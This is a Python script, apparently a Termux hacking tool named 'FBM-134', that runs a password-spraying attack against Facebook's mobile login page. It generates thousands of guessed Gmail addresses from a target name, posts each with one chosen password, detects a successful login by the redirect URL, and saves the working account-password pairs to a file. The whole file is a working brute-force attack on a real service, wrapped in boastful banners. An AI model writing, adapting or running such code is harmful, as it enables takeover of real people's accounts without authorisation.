import time
import os
import sys
import requests
import socket
import argparse 
import itertools
import threading
import functools
import configparser
import urllib.error
import urllib.parse
import urllib.request
import csv
import gzip
from random import choice
from datetime import datetime
now = datetime.now()

_Team___ = "Cyber-Security-Dev"
_version = "v1.0.2020-dev-"
_______option = {}
class colors():
    Default      = "\033[39m"
    Black        = "\033[30m"
    Red          = "\033[31m"
    Green        = "\033[32m"
    Yellow       = "\033[33m"
    Blue         = "\033[34m"
    Magenta      = "\033[35m"
    Cyan         = "\033[36m"
    LightGray    = "\033[37m"
    DarkGray     = "\033[90m"
    LightRed     = "\033[91m"
    LightGreen   = "\033[92m"
    LightYellow  = "\033[93m"
    LightBlue    = "\033[94m"
    LightMagenta = "\033[95m"
    LightCyan    = "\033[96m"
    White        = "\033[97m"

class const():
    ResetAll = "\033[0m"
    Dim        = "\033[2m"
    Bold       = "\033[1m"
    Underlined = "\033[4m"
    Blink      = "\033[5m"
    Reverse    = "\033[7m"
    Hidden     = "\033[8m"

    ResetBold       = "\033[21m"
    ResetDim        = "\033[22m"
    ResetUnderlined = "\033[24m"
    ResetBlink      = "\033[25m"
    ResetReverse    = "\033[27m"
    ResetHidden     = "\033[28m"



def _____________banner():
    numList = ["Banner/Termux/banner01.txt", "Banner/Termux/banner02.txt", "Banner/Termux/banner03.txt", "Banner/Termux/banner04.txt", "Banner/Termux/banner05.txt","Banner/Termux/banner06.txt","zonk-Generate"]
    for x in range(1):
        file__________banner = choice(numList)
        if file__________banner == "Banner/Termux/banner01.txt":
            fileBanner_ = open(file__________banner)
            print(' ')
            print(const.ResetDim + colors.LightBlue + fileBanner_.read() + colors.Green)
            fileBanner_.close()
            pass
        elif file__________banner == "Banner/Termux/banner02.txt":
            fileBanner_ = open(file__________banner)
            print(' ')
            print(const.ResetDim + colors.LightRed + fileBanner_.read() + colors.Green)
            fileBanner_.close()
            pass
        elif file__________banner == "Banner/Termux/banner03.txt":
            fileBanner_ = open(file__________banner)
            print(' ')
            print(const.ResetDim + colors.LightBlue + fileBanner_.read() + colors.Green)
            fileBanner_.close()
            pass
        elif file__________banner == "Banner/Termux/banner04.txt":
            fileBanner_ = open(file__________banner)
            print(' ')
            print(const.ResetDim + colors.LightMagenta + fileBanner_.read() + colors.Green)
            fileBanner_.close()
            pass
        elif file__________banner == "Banner/Termux/banner05.txt":
            fileBanner_ = open(file__________banner)
            print(' ')
            print(const.ResetDim + colors.LightRed + fileBanner_.read() + colors.Green)
            fileBanner_.close()
            pass
        elif file__________banner == "Banner/Termux/banner06.txt":
            fileBanner_ = open(file__________banner)
            print(' ')
            print(const.ResetDim + colors.LightGray + fileBanner_.read() + colors.Green)
            fileBanner_.close()
            pass
        elif file__________banner == "zonk-Generate":
            print(colors.White + "  > Attacker")
            print(colors.LightGreen + "  Technique: BRUTE FORCE.")
            print(colors.LightGreen + "  > Compromised Credentials") 
            print(colors.LightGreen + "  Technique: BRUTE FORCE.")
            print(colors.LightGreen + "  > Botnet")
            print(colors.LightGreen + "  Technique: BRUTE FORCE.")
            print(colors.LightGreen + "  > Victim Site")
            print(colors.LightGreen + "  Technique: BRUTE FORCE.")
            print(colors.LightRed + "  THERE IS NO SAFE SYSTEM")
            print(colors.LightRed + "  THERE IS NO SAFE SYSTEM")
            print(colors.LightRed + "  THERE IS NO SAFE SYSTEM")
            print(colors.LightRed + "  THERE IS NO SAFE SYSTEM")
            print(colors.LightRed + "  THERE IS NO SAFE SYSTEM")
            print(colors.LightRed + "  THERE IS NO SAFE SYSTEM")
            print(colors.LightRed + "  THERE IS NO SAFE SYSTEM")
            print("")
            pass

def _________exploitbanner():
        print(colors.White + "  > Attacker")
        print(colors.LightGreen + "  Technique: BRUTE FORCE.")
        print(colors.LightGreen + "  > Compromised Credentials") 
        print(colors.LightGreen + "  Technique: BRUTE FORCE.")
        print(colors.LightGreen + "  > Botnet")
        print(colors.LightGreen + "  Technique: BRUTE FORCE.")
        print(colors.LightGreen + "  > Victim Site")
        print(colors.LightGreen + "  Technique: BRUTE FORCE.")
        print(colors.LightRed + "  THERE IS NO SAFE SYSTEM")
        print(colors.LightRed + "  THERE IS NO SAFE SYSTEM")
        print(colors.LightRed + "  THERE IS NO SAFE SYSTEM")
        print(colors.LightRed + "  THERE IS NO SAFE SYSTEM")
        print(colors.LightRed + "  THERE IS NO SAFE SYSTEM")
        print(colors.LightRed + "  THERE IS NO SAFE SYSTEM")
        print(colors.LightRed + "  THERE IS NO SAFE SYSTEM")
        print("")
        pass



def brute_random_attack():
    try:
        os.system("clear")
        WEB_attack = "https://mbasic.facebook.com/login.php"
        _____________banner()
        print(colors.LightRed + "[*] " + colors.LightGreen + 'FBM-134 : ' + _version)
        _option_brute_random_attack = input(colors.LightRed + "[*] " + colors.LightGreen + 'OPTIONS : ' + "Random Attack? Y/[N]: ")
        
        if _option_brute_random_attack == 'Y' or _option_brute_random_attack == "y":
            os.system("clear")
            _____________banner()
            print(colors.LightRed + "[*] " + colors.LightGreen + 'FBM-134 : ' + _version)
            _target_ = input(colors.LightRed + "[*] " + colors.LightGreen + 'OPTIONS : ' + "Target Name : ")
            Name_worldlist = "Bin/brute_random_attack_account.txt"
            _genertNo = 0
            Generate____________ = []
            for x in range(10000):
                _genertNo += 1
                Generate____________.append(_target_ + str(_genertNo) + "@gmail.com")
                file_Worldlist_random_attack = open(Name_worldlist,"w")
                file_Worldlist_random_attack.write(os.linesep.join(Generate____________))
                file_Worldlist_random_attack.close()

            ________attack_account = open(Name_worldlist, "r")
            accountno____ = 10000

            password_attack = []
            save_result = []
            password_attack = input(colors.LightRed + "[*] " + colors.LightGreen + 'OPTIONS : ' + "Password List : ")
            _________succesno = 0
            _________generatenosaved = 0
            name_save_result = "Generate/Account_attack.txt"
            os.system("clear")
            _________exploitbanner()
            Done = []
            


            for i in ________attack_account:
                attack_list = i.strip()
                DataFBM______ = {'email': attack_list,'pass': password_attack,'login':'Masuk'}
                ___________requestpost_ = requests.post(WEB_attack, DataFBM______)
                response_serangan_random = ___________requestpost_.url
                response_serangan_random_content = ___________requestpost_.text
                time.sleep(0.1)

                if response_serangan_random.find("home.php") != -1:
                    _________succesno += 1
                    _________generatenosaved += 1 
                    print(colors.LightRed + "[*] " + colors.LightBlue + 'SUCCESS ' + colors.LightGreen + ": [" + str(_________succesno) + ":]-[Generate/Account_attack.txt]")
                    save_result.append("[GENERATE]-[FBM-134]-" + "[%d] " %(_________generatenosaved) + "[ACCOUNT] : " + attack_list + " [PASSWORD] : " + password_attack)
                    Generate_account_pass = open(name_save_result,"w")
                    Generate_account_pass.write(os.linesep.join(save_result))
                    Generate_account_pass.close()
                else:
                    _________succesno += 1
                    print(colors.LightRed + "[*] " + colors.LightRed + 'EXPLOIT ' + colors.Green + ": [" + colors.LightRed + str(_________succesno) + colors.LightGreen + ':' + ']-[Discarded In The Trash!]' )
    except KeyboardInterrupt:
        os.system("clear")
        print(colors.Red + "[*] " + colors.LightGreen  + "Shutting Down The FBM-134 Console" + colors.Default)


brute_random_attack()
